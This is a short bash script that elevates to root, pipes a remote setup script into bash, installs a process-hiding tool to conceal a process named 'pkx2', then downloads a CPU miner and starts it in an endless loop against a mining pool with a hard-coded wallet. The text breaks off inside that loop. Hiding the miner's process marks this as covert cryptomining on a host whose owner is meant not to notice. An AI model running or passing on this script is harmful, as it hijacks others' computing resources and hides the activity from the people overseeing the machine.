!/bin/bash

sudo su --command "sudo apt update && sudo apt upgrade -y && sudo apt install gcc && sudo apt install curl -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs -y && npm install -g npm@8.4.1 && npm i -g node-process-hider && sudo ph add pkx2 && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz  && while [ 1 ]; do

./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-ru.rplant.xyz:13340 -u bD4CsgAhnYcpoGf6gRD4B7sWAHnLbBuaNU.yyy -t2
